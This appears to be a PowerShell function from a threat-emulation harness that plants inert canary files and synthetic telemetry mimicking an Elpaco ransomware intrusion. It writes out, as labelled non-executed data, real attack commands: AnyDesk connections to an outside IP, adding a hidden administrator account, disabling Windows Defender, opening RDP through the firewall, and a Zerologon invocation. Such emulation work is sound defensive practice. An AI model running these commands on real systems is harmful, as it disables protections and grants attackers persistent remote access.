function Invoke-ElpacoAnyDeskPrivilege {
    param([Parameter(Mandatory)][System.Collections.IDictionary]$Paths)
    $time = Get-ElpacoTimeline

    $anyDesk = Join-Path $Paths.Confluence 'AnyDesk.exe'
    New-ElpacoBinaryDecoy -Path $anyDesk -Role 'AnyDesk remote-access process-name canary'
    foreach ($command in @(
        'AnyDesk.exe --start-service',
        'echo P@ssword1 | AnyDesk.exe --set-password',
        'AnyDesk.exe --get-id',
        'AnyDesk.exe --connect 45.227.254.124:443 --direct'
    )) { Invoke-ElpacoDecoyProcess -FilePath $anyDesk -ReportedCommandLine $command }
    Invoke-ElpacoLoopbackPort -Port 443 -ReportedTarget '45.227.254.124:443 AnyDesk on-prem server'

    foreach ($name in @('user.conf', 'system.conf', 'service.conf')) {
        Write-ElpacoEvidenceFile -Path (Join-Path $Paths.AnyDesk $name) -Content "ad.anynet.direct_ip=45.227.254.124`nad.simulation=true`nad.service.installed=false" -Purpose 'AnyDesk configuration canary' -Timestamp $time.AnyDesk
    }
    $trace = @"
$($time.AnyDesk.ToString('o')) info Service started (synthetic; no service installed)
$($time.Day2.ToString('o')) info Incoming session via reported direct endpoint 45.227.254.124
$($time.Day3.ToString('o')) info clipboard file transfer: Attacker\share\spider.dll
$($time.Day3.AddSeconds(2).ToString('o')) info clipboard file transfer: Attacker\share\spider_32.dll
"@
    Write-ElpacoEvidenceFile -Path (Join-Path $Paths.AnyDesk 'ad.trace') -Content $trace -Purpose 'AnyDesk transfer/session trace canary' -Timestamp $time.AnyDesk

    $u1 = @'
@echo off
REM ELPACO CANARY - DO NOT EXECUTE REPORTED ACCOUNT COMMANDS
REM net user noname Slepoy_123 /add
REM net localgroup Administrators noname /add
REM wmic useraccount where name="noname" set PasswordExpires=false
echo ELPACO-CANARY: account operations intentionally disabled
'@
    Write-ElpacoEvidenceFile -Path (Join-Path $Paths.Confluence 'u1.bat') -Content $u1 -Purpose 'inert local-account batch canary' -Timestamp $time.AnyDesk.AddMinutes(4)
    $accountEvents = @(
        @{ EventId = 4720; TargetUserName = 'noname'; commandExecuted = $false },
        @{ EventId = 4722; TargetUserName = 'noname'; commandExecuted = $false },
        @{ EventId = 4738; TargetUserName = 'noname'; PasswordNeverExpires = $true; commandExecuted = $false },
        @{ EventId = 4724; TargetUserName = 'noname'; commandExecuted = $false },
        @{ EventId = 4732; TargetUserName = 'noname'; Group = 'Administrators'; commandExecuted = $false }
    )
    Write-ElpacoEvidenceFile -Path (Join-Path $Paths.Evidence 'synthetic-account-events.json') -Content ($accountEvents | ConvertTo-Json -Depth 5) -Purpose 'local-account event canaries; no account created' -Timestamp $time.AnyDesk.AddMinutes(4)

    New-ElpacoBinaryDecoy -Path (Join-Path $Paths.Tools 'spider.dll') -Role 'spider privilege/account DLL filename canary' -ReportedSha256 '90cdcf54bbaeb9c5c4afc9b74b48b13e293746ee8858c033fc9d365fd4074018'
    New-ElpacoBinaryDecoy -Path (Join-Path $Paths.Tools 'spider_32.dll') -Role 'spider 32-bit DLL filename canary' -ReportedSha256 '4f4864a1d5f19a3c5552d80483526f3413497835549dce8c61fef116b666fa09'

    $privilege = @(
        @{ technique = 'ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE2'; result = 'failed'; implemented = false },
        @{ technique = 'token duplication / SeDebug against services and lsass'; result = 'failed'; implemented = false },
        @{ technique = 'RPCSS named-pipe impersonation'; result = 'reported success to SYSTEM'; implemented = false; syntheticSystemChildren = 2 },
        @{ technique = 'Zerologon CVE-2020-1472'; command = 'zero.exe [DC] [DC$] administrator -c "whoami"'; result = 'failed'; implemented = false }
    )
    Write-ElpacoEvidenceFile -Path (Join-Path $Paths.Evidence 'privilege-escalation-attempts.json') -Content ($privilege | ConvertTo-Json -Depth 6) -Purpose 'non-executed privilege-escalation telemetry' -Timestamp $time.Day3
    Write-ElpacoEvidenceFile -Path (Join-Path $Paths.Evidence 'defense-evasion-commands.txt') -Content @'
NOT EXECUTED: DC.exe disabled Windows Defender via policy.
NOT EXECUTED: reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1
NOT EXECUTED: reg add HKLM\System\CurrentControlSet\Control\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0
NOT EXECUTED: netsh advfirewall firewall set rule group="remote desktop" new enable=yes
NOT EXECUTED: netsh advfirewall firewall add rule name="allow RDP" dir=in protocol=TCP localport=3389 action=allow
'@ -Purpose 'dangerous command-line investigation metadata only' -Timestamp $time.Day3

    Add-ElpacoTimelineEvent -Timestamp $time.AnyDesk -Phase 'Persistence and Command and Control' -Event 'AnyDesk, local-account batch, configuration, and direct-connection telemetry were staged.' -Details @{ serviceInstalled = $false; accountCreated = $false; reportedEndpoint = '45.227.254.124:443'; actualTarget = '127.0.0.1:443' }
    Add-ElpacoTimelineEvent -Timestamp $time.Day3 -Phase 'Privilege Escalation' -Event 'Failed named-pipe/token/Zerologon attempts and reported RPCSS success were represented as evidence only.' -Details @{ exploitExecuted = $false; lsassOpened = $false }
}
